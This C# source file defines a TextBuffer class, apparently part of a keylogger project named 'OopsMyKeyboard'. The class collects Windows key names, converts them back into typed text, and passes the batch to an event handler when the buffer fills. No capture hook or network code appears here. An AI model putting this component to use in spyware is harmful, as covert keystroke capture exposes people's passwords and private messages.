using System.Text;

namespace OopsMyKeyboard
{
    public class TextBuffer
    {
        public delegate void BufferOverflowedEventHandler(string text);
        public event BufferOverflowedEventHandler BufferOverflowed;

        private long _max;
        private int _currentIndex;
        private string[] text;

        public TextBuffer(long max)
        {
            _max = max;
            text = new string[max];
            _currentIndex = 0;
        }

        public void Add(string value)
        {
            if (_currentIndex >= _max)
            {
                if (BufferOverflowed != null)
                    BufferOverflowed(this.ToString());

                ResetBuffer();

            } else
            {
                text[_currentIndex] = value;
                _currentIndex++;
            }
        }

        public void ResetBuffer()
        {
            text = new string[_max];
            _currentIndex = 0;
        }

        public override string ToString()
        {
            var phrase = new StringBuilder();

            foreach (var t in text)
            {
                switch (t)
                {
                    case "LControlKey":
                    case "LWin":
                    case "LShiftKey":
                    case "Capital":
                    case "Oem5":
                    case "Oem6":
                    case "Oem7":
                    case "OemOpenBrackets":
                    case "Back":
                        {
                            break;
                        }
                    case "Oemcomma":
                        {
                            phrase.AppendLine(",");
                            break;
                        }
                    case "Tab":
                        {
                            phrase.AppendLine("    ");
                            break;
                        }
                    case "Space":
                        {
                            phrase.Append(" ");
                            break;
                        }
                    case "Return":
                        {
                            phrase.AppendLine();
                            break;
                        }
                    case "D1":
                    case "NumPad1":
                        {
                            phrase.Append("1");
                            break;
                        }
                    case "D2":
                    case "NumPad2":
                        {
                            phrase.Append("2");
                            break;
                        }
                    case "D3":
                    case "NumPad3":
                        {
                            phrase.Append("3");
                            break;
                        }
                    case "D4":
                    case "NumPad4":
                        {
                            phrase.Append("4");
                            break;
                        }
                    case "D5":
                    case "NumPad5":
                        {
                            phrase.Append("5");
                            break;
                        }
                    case "D6":
                    case "NumPad6":
                        {
                            phrase.Append("6");
                            break;
                        }
                    case "D7":
                    case "NumPad7":
                        {
                            phrase.Append("7");
                            break;
                        }
                    case "D8":
                    case "NumPad8":
                        {
                            phrase.Append("8");
                            break;
                        }
                    case "D9":
                    case "NumPad9":
                        {
                            phrase.Append("9");
                            break;
                        }
                    case "D0":
                    case "NumPad0":
                        {
                            phrase.Append("0");
                            break;
                        }
                    default:
                        {
                            phrase.Append(t);
                            break;
                        }
                }

            }

            return phrase.ToString();
        }
    }
}
